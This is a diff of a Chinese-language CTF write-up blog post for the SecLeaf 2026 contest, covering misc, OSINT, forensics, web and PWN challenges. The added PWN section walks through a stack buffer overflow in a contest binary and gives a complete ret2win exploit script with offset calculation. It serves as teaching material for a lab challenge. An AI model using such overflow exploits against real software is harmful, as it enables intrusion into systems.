@@ -12,54 +12,14 @@ url: /posts/12secleaf2026/
 aliases:
   - /posts/12sec/12secleaf2026/
 ---
+
+先叠个甲：
+- 这是一场很水的比赛
+- 内容也很基础，没有技术含量
+
 # `Misc`
-## 1.`SanityCheck`（合理性检查）
-### 题目描述
-`Find the flag on our YT Channel` [https://www.youtube.com/@SecLeaf](https://www.youtube.com/@SecLeaf)
 
-### 解题思路
-打开链接发现是赛事通知，展开文章即可看到`flag`  ![](1.png)
-
----
-
-## 2.`vaultcore`
-### 题目描述
-```text
-We recovered a protected vault executable from an abandoned workstation.
-
-Initial analysis suggests:
-
-anti-debugging routines
-payload decryption
-integrity verification
-Can you recover the secure access token?
-
-Flag format: SecLeaf{}
-
-我们从一台废弃的工作站中恢复了一个受保护的保险库可执行文件。
-
-初步分析表明：
-
-反调试例程  
-载荷解密  
-完整性校验  
-
-你能恢复安全访问令牌吗？
-```
-
-### 解题思路
-附件下载后发现无法直接看出文件类型，于是用`010Editor`打开，在开头也没看出文件类型，拉到最后发现了`flag`~~瞎猫碰上死耗子~~  ![](2.png)
-
-也可以用
-```bash
-strings -a vaultcore | grep -i "SecLeaf"
-```
-输出得到`flag` 
-![](3.png)
-
----
-
-## 3.`Digital Rockstar`
+## 1.`Digital Rockstar`
 ### 题目描述
 ```txt
 Some programmers write code. Others write poetry.
@@ -85,20 +45,20 @@ Say Dreams
 ```
 
 ### 解题思路
-**1‍⃣识别语言**:
+1‍⃣**识别语言**:
 根据文件拓展名`.rock`与代码风格（类似歌词的语法），可以识别出这是`"Rockstar"`语言
 ```txt
 Rockstar 是一门专门为创意程序员设计的动态类型、图灵完备的“纵欲型”编程语言。它的语法完全基于 20 世纪 80 年代重摇滚和强力情歌（Power Ballads）的歌词 convention 编写，这意味着你的代码即可以是程序，同时也是一首完整的摇滚歌曲。
 ```
 
-**2‍⃣了解语法**：
+2‍⃣**了解语法**：
 `Rockstar` 语言的关键特性：
 - `is` / `are` / `was`：变量赋值
 - `with`：字符串拼接
 - `Say` / `Shout` / `Whisper`：输出
 - **Poetic Numbers（诗意数字）**：当赋值语句右侧不以数字或关键字开头时，每个单词的字母数会被解析为十进制数字（忽略空格和非字母字符）
 
-**3‍⃣尝试标准解析：**
+3‍⃣**尝试标准解析：**
 按照 `Rockstar` 标准的 `poetic number` 规则解析：
 
 | 变量       | 右侧内容       | 字母数 → 数字    |
@@ -110,7 +70,7 @@ Rockstar 是一门专门为创意程序员设计的动态类型、图灵完备�
 
 拼接结果：`34623` — 这显然不是 `flag`。
 
-**4‍⃣分析异常与提示：**
+4‍⃣**分析异常与提示：**
 仔细观察代码，发现两处异常：
 1. **第 3 行**：`Chaos is poetry ` — `poetry` 后面有一个**多余的空格**
 2. **第 4 行**：`Neon is is fun` — 出现了**两个 `is`**
@@ -120,7 +80,7 @@ Rockstar 是一门专门为创意程序员设计的动态类型、图灵完备�
 - 将 `is` 右侧的内容视为**原始字符串**
 - 将字母 `i` 替换为数字 `1`
 
-**5‍⃣按原始字符串解析：**
+5‍⃣**按原始字符串解析：**
 将每个变量 `is` 右侧的内容作为原始字符串提取（保留所有空格和字符）：
 
 | 变量         | 右侧原始字符串               |
@@ -137,7 +97,7 @@ SecLeaf{poetry_1s_fun}
 
 ---
 
-## 4.`The Invoice Incident`
+## 2.`The Invoice Incident`
 ### 题目描述
 ```txt
 The Invoice Incident
@@ -191,23 +151,6 @@ SecLeaf{Invoice_April_2026.docm}
 
 ---
 
-# `Cryptography`
-## 1.`military_grade_encryption`
-### 题目描述
-附件下载后为`txt`文本，内容：
-```txt
-U2VjTGVhZntiNDUzNjRfMXNfbjB0XzNuY3J5cHQxMG59
-```
-
-### 解题思路
-看起来比较像`Base64`编码，解码后得到`flag`
-```bash
-cat encrypted.txt | base64 -d
-```
-![](4.png)
-
----
-
 # `OSINT`
 ## `Can_you_Find_Cafe`
 ### 题目描述
@@ -233,61 +176,8 @@ SecLeaf{Cafe_Goodluck+Deccan_Gymkhana}
 ---
 
 # `Forensics`
-## 1.`Forgotten_snapshot`
-### 题目描述
-```txt
-We recovered this image from a damaged backup archive.
 
-Analysts believe the original owner attempted to conceal sensitive information before deletion.
-
-Some image data may have survived recovery.
-
-Flag format: SecLeaf{}
-
-
-我们从损坏的备份存档中恢复了此镜像。
-
-分析人员认为，原所有者在删除前试图隐藏敏感信息。
-
-部分镜像数据可能在恢复后仍然存在。
-```
-
-### 解题思路
-![](snapshot.jpg)
-附件左下角有个网址，但在浏览器上搜索后并没有成功搜索出来
-于是用`010`打开，很容易就找到了`flag`
-![](9.png)
-
----
-
-## 2.`Important`
-### 题目描述
-```txt
-A suspicious image file was recovered during investigation. It appears harmless, but appearances can be misleading.
-
-Inspect the file carefully, determine its true format, and recover the hidden flag.
-
-File Provided: important.jpg
-
-Flag Format: SecLeaf{}
-
-调查过程中发现一个可疑的图像文件。它看似无害，但表象往往具有欺骗性。
-
-请仔细检查该文件，确定其真实格式，并恢复隐藏的标志。
-```
-
-### 解题思路
-`jpg`附件无法直接用看图工具打开，于是用`010`查看
-![](10.png)
-发现了`flag.txt`，于是`binwalk`分离得到`txt`文件
-```bash
-binwalk -e Important.jpg
-```
-![](11.png)
-
----
-
-## 3.`Force-push-wont-save-you`
+## 1.`Force-push-wont-save-you`
 ### 题目描述
 ```txt
 A developer force-pushed several times before the repository was archived.
@@ -306,7 +196,7 @@ Flag format: SecLeaf{}
 ```
 
 ### 解题思路
-**1‍⃣先将附件解压并查看里面包含的文件**
+1‍⃣**先将附件解压并查看里面包含的文件**
 ```bash
 unzip challenge.zip
 cd force-push-wont-save-you
@@ -320,7 +210,7 @@ ls -la
 
 所以我们除了看当前文件，还要看`Git`历史与`Git`对象
 
-**2‍⃣先看当前文件**
+2‍⃣**先看当前文件**
 ```bash
 cat app.js
 ```
@@ -331,7 +221,7 @@ TODO REMOVE HARDCODED TOKEN
 ```
 我们可以看出以前可能真的提交过敏感信息，但后来被删除了——所以继续查历史
 
-**3‍⃣查询所有能看到的提交历史**
+3‍⃣**查询所有能看到的提交历史**
 ```bsah
 git log --oneline --all --decorate --graph
 ```
@@ -350,7 +240,7 @@ git grep -n "SecLeaf" $(git rev-list --all)
 ![](17.png)
 也不是真正的`flag`
 
-**4‍⃣根据题目说的“Some objects may no longer be referenced”，所以查 dangling objects**
+4‍⃣**根据题目说的“Some objects may no longer be referenced”，所以查 dangling objects**
 ```bash
 git fsck --full --no-reflogs --lost-found
 ```
@@ -359,7 +249,7 @@ git fsck --full --no-reflogs --lost-found
 ![](19.png)
 但是这两个也是假的`flag`。到这里发现题目在故意引导只查`Git`历史与`dangling objects`，但这些都是假的
 
-**5‍⃣继续全局搜索整个目录**
+5‍⃣**继续全局搜索整个目录**
 因为前面找到的全是假的`flag`，所以应该扩大范围
 ```bash
 grep -RIn --binary-files=text "SecLeaf" .
@@ -367,7 +257,7 @@ grep -RIn --binary-files=text "SecLeaf" .
 ![](20.png)
 
 ---
-## 4.`needle_in_context`
+## 2.`needle_in_context`
 ### 题目描述
 ```txt
 During a failed forensic recovery attempt, several debug logs were partially reconstructed.
@@ -386,16 +276,16 @@ Flag format: SecLeaf{}
 ```
 
 ### 解题思路
-**1‍⃣解压文件、查看文件内容**：解压后看到大量的日志文件；同时根据题目可以看出：**`flag`是拼接而成的**，同时还会有很多假的`flag`
+1‍⃣**解压文件、查看文件内容**：解压后看到大量的日志文件；同时根据题目可以看出：**`flag`是拼接而成的**，同时还会有很多假的`flag`
 
-**2‍⃣先搜索`SecLeaf`**：
+2‍⃣**先搜索`SecLeaf`**：
 ```bash
 grep -RIn "SecLeaf" .
 ```
 ![](21.png)
 有搜索结果，但是这些都是`{temporary_xxxxx}`——无用的`flag`
 
-**3‍⃣搜索可能的碎片关键词**
+3‍⃣**搜索可能的碎片关键词**
 题目说
 ```txt
 fragments of sensitive data
@@ -421,15 +311,224 @@ SecLeaf{context_is_the_real_enemy}
 
 ---
 
-# 碎碎念
-这场比赛应该是我参加的第一场有效比赛。为什么是有效呢？因为之前也参加过几场`CTF`比赛，但那时一是在寒假（我游戏瘾最大的一段时间），二是那时还停留在`DeepSeek`（也没有说`ds`不好用的意思），参与度就仅限于报名了。
-报名这场比赛时我只是想着给我的周末“找事干”，同时还没有用`GPT`打过比赛，另外还有在过去大半年也断断续续学了点（真的只有一点），想着检测一下学习成果。有点不好意思的是，比赛刚开始时除了签到题我是自己做的外，其他题目都是直接用`AI`梭（虽然这后来看了下其中很多题也差不多属于签到题，连我这样的水平也能一眼看到解题思路）。“二战转折点”在`Can_you_Find_Cafe`出来后，我已经从最开始打比赛时追求排名的激情转向了“得把梭出来的题自己做一遍”，于是就尝试了一下那道社工题。
-![](12.png)
-（这是我们队成绩最好的一次了）
+# `Web`
+## 1.`Hidden_panel`
+### 题目描述
+```txt
+We discovered a partially exposed internal web portal during reconnaissance.
+
+Developers claimed sensitive endpoints were “properly hidden.”
+
+Can you discover what was left behind?
+
+Link: [https://s3.secleaf.tech/](https://s3.secleaf.tech/)
+
+Flag format: SecLeaf{}
+
+在侦察阶段，我们发现了一个部分暴露的内部 Web 门户。
+
+开发人员声称，敏感端点已“妥善隐藏”。
+
+你能否找出那些被遗留下的内容？
+```
+
+### 解题思路
+1‍⃣先查看源码，并没有发现什么关于`flag`的线索
+2‍⃣于是检查`robots.txt`，在最下面找到了`flag`
+```txt
+https://s3.secleaf.tech/robots.txt
+```
+![](24.png)
 
 ---
-这次收获还是挺大的，至少有好几道题目之前一直没有尝试，这次得到了有效反馈
-- `The Invoice Incident`
-- `Can_you_Find_Cafe`
-- `Force-push-wont-save-you`
-- `needle_in_context`
+
+# `PWN`
+## 1.`ret2win`
+### 题目描述
+```txt
+A vulnerable SECLEAF access terminal was recovered from a decommissioned internal server.
+
+The developers claimed the system was "unbreakable."
+
+Can you prove otherwise?
+
+Flag Format: SecLeaf{}
+
+一个存在漏洞的 SECLEAF 访问终端已从一台已停用的内部服务器中恢复。
+
+开发人员声称该系统“坚不可摧”。
+
+你能证明他们的说法是错误的吗？
+```
+
+### 解题思路
+1‍⃣**先查看文件类型**
+```bash
+file ret2win
+```
+得到的结果是：
+```txt
+ELF 64-bit LSB executable, x86-64
+```
+说明它是：
+```txt
+64位Linux可执行文件
+```
+
+>`ELF`:
+>	`Windows`程序常见格式：`PE`，比如`.exe`
+>	`Linux`程序常见格式：`ELF`
+>`executable`：可执行文件，即可以运行
+
+2‍⃣**看程序里有没有明显字符串**
+```bash
+strings -a ret2win
+```
+![](25.png)
+其中：
+```txt
+Access Granted!
+Flag:%s
+```
+非常像程序成功后会打印的内容
+结合题目名`ret2win`，可以推测程序里大概存在一个`win`函数用来打印`flag`
+
+3‍⃣**继续查看函数符号**
+继续使用`nm`查看函数名和地址
+```bash
+nm -n ret2win
+```
+可以看到：
+```txt
+0000000000401166 T decode
+00000000004011b1 T win
+000000000040123b T vuln
+000000000040128d T main
+```
+这里重点关注两个函数：
+```txt
+win  地址：0x4011b1
+vuln 地址：0x40123b
+```
+`win`函数就是我们想要跳转过去的目标函数
+
+4‍⃣**分析`vuln`函数**
+使用 `objdump` 反汇编：
+```bash
+objdump -d -M intel ret2win
+```
+找到`vuln`函数：
+![](26.png)
+
+> ```asm
+> sub rsp,0x40
+> ```
+> 说明程序在栈上开辟了`0x40`字节空间
+> `0x40`换成十进制为`64`，也就是说：局部变量缓冲区大小为64字节
+
+>```asm
+>mov esi,0xc8
+>call fgets
+>```
+>`0xc8`换成十进制为`200`：说明程序用`fgets`最多读取200字节输入
+
+也就是说：
+```txt
+缓冲区只有64字节，但程序允许输入200字节
+```
+这就造成了栈溢出
+
+5‍⃣**计算偏移量**
+64 位程序中，函数栈结构大概如下：
+```txt
+低地址
+[ buffer 64 字节 ]
+[ saved rbp 8 字节 ]
+[ return address 8 字节 ]
+高地址
+```
+程序的`buffer`位于：
+```asm
+[rbp-0x40]
+```
+所以`buffer`到返回地址之间需要填充：
+```txt
+64 字节 buffer + 8 字节 saved rbp = 72 字节
+```
+因此返回地址偏移量是：`72`;
+`payload`结构为：
+```txt
+"A" * 72 + win函数地址
+```
+
+6‍⃣**构造`payload`**
+前面通过 nm 得到：
+```txt
+win = 0x4011b1
+```
+由于 `x86-64`使用小端序，所以地址 `0x4011b1`写入内存时应为：
+```txt
+b1 11 40 00 00 00 00 00
+```
+可以用 `Python` 的 `struct.pack` 来处理：
+```python
+struct.pack("<Q", 0x4011b1)
+```
+其中：
+```txt
+< 表示小端序
+Q 表示 8 字节无符号整数
+```
+最终 `exp` 如下：
+```python
+import sys
+import struct
+
+payload = b"A" * 72
+payload += struct.pack("<Q", 0x4011b1)
+
+sys.stdout.buffer.write(payload + b"\n")
+```
+运行：
+```bash
+python3 exp.py | ./ret2win
+```
+
+7‍⃣**获取`flag`**
+执行后程序成功跳转到 `win` 函数，输出：
+```txt
+Access Granted!
+Flag: SecLeaf{sm4sh_th3_st4ck}
+```
+
+8‍⃣**总结：**
+整体思路：
+```txt
+查看文件类型
+        ↓
+发现是 64 位 ELF
+        ↓
+strings 发现 Access Granted 和 Flag 字符串
+        ↓
+nm 找到 win 函数地址
+        ↓
+objdump 分析 vuln 函数
+        ↓
+发现 buffer 只有 64 字节，但 fgets 读取 200 字节
+        ↓
+计算偏移：64 + 8 = 72
+        ↓
+构造 payload：72 字节填充 + win 地址
+        ↓
+覆盖返回地址，跳转到 win
+        ↓
+获得 flag
+```
+
+---
+
+# 碎碎念
+- 这场比赛应该是我参加的第一场有效比赛。为什么是有效呢？因为之前也参加过几场`CTF`比赛，但那时一是在寒假（我游戏瘾最大的一段时间），二是那时还停留在`DeepSeek`（也没有说`ds`不好用的意思），参与度就仅限于报名了。
+- 报名这场比赛时我只是想着给我的周末“找事干”，同时还没有用`GPT`打过比赛，另外还有在过去大半年也断断续续学了点（真的只有一点），想着检测一下学习成果。有点不好意思的是，比赛刚开始时除了签到题我是自己做的外，其他题目都是直接用`AI`梭（虽然这后来看了下其中很多题也差不多属于签到题，连我这样的水平也能一眼看到解题思路）。“二战转折点”在`Can_you_Find_Cafe`出来后，我已经从最开始打比赛时追求排名的激情转向了“得把梭出来的题自己做一遍”，于是就尝试了一下那道社工题。
+![](12.png)
+（这是我们队成绩最好的一次了）
